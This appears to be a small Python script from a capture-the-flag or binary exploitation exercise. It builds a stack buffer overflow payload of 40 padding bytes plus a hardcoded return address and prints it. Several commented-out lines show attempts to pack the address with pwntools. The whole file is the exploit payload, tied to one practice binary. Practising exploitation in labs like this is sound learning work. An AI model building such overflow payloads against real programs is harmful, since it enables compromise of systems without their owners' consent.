# from pwn import *
import sys 

offset = 40
payload = 'A' * offset
address ='\x99\x11\x40'
command = 'cd ..'

# a2 = p64(0x000000401199).decode('utf-8')

# print (payload)
# sys.stdout.buffer.write(address)
# print(address)
print(payload+address)

# hex_string = int.from_bytes(address,byteorder='little')
# print(payload + p64(hex_string).decode('utf-8'))
# # str =str.byte_sequence('utf-8')
# # payload = payload + p64()
# # print(payload)
